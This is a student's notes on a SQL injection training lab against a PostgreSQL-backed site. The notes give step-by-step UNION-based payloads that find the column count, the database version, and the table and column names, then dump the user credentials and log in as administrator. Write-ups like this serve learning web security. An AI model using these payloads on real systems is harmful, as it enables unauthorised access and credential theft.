==>SQLi Lab 5:
==>goal: listing the databse contents on non oracle database and login as administrator to solve the lab

==>tools used:
1. owasp-zap (proxy)
2. foxyproxy
3. browser
4. nvim (documenting, notes)

==> tasks:
1. find out the table name that contains username and passwords
2. in that table find the name of columns that contain username and password
3. output the contents of the table and from that find the administrator's username and password
4. log in as administrator

>find the number of columns backend query is using
payload: ' order by 3--
there are 2 columns query is using

>what are the datatype of those columns?
payload: ' UNION SELECT 'a', 'a'--
we find that both the columns use text(string) data type

>what is the version of database we are using (so that we know what kind of db we are using to refine our payload)
payload: postgresql: ' UNION SELECT version(), NULL--
output: PostgreSQL 12.15 (Ubuntu 12.15-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0, 64-bit
as about we get our o/p now we know what kind of database is running on a backend, if it's wrong kind of db then o/p will throw a internal
server error.

>print of the table names stored in DB so we can find our desired table
because we have postgresql on our hand we use that platform's query
payload: ' UNION SELECT table_name, NULL FROM information_schema.tables--
we find table named : users_ebpxle

>find out the names of columns in that table
so we can find the column names containing usernames and passwords
payload: ' UNION SELECT column_name, NULL FROM information_schema.columns where table_name = 'users_ebpxle'--
we find our column names
username : username_pcsagv
password : password_ebclmk

>now we will print the columns and from them find the username and password of administrator
payload: ' UNION SELECT username_pcsagv, password_ebclmk FROM users_ebpxle--
we got username: administrator and password: 45oeaqyxr13sex2x0hiv

>now the olny thing left to do is log in as admin with the username and password we found
and we have successfully solved the lab... congrats
